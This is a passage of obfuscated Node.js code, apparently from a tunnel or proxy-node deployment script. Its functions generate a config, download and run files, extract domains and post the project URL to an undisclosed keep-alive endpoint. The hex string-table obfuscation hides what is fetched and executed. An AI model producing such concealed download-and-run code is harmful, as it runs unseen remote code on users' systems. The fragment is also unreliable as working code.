AddVisitTask(){const _0x3ab035=_0x518edc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3ab035(0x16d)](_0x3ab035(0x1c6));return;}try{const _0xa59700=await axios[_0x3ab035(0x1e7)](_0x3ab035(0x17c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3ab035(0x144)}});return console[_0x3ab035(0x16d)](_0x3ab035(0x164)),_0xa59700;}catch(_0x5c080b){return console[_0x3ab035(0x143)](_0x3ab035(0x155)+_0x5c080b['message']),null;}}async function startserver(){const _0x45248a=_0x518edc;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x451ac9){console[_0x45248a(0x143)](_0x45248a(0x179),_0x451ac9);}}startserver()['catch'](_0x191454=>{const _0x5e33f5=_0x518edc;console[_0x5e33f5(0x143)](_0x5e33f5(0x1d9),_0x191454);}),app[_0x518edc(0x1f5)](PORT,()=>console['log'](_0x518edc(0x14b)+PORT+'!'));
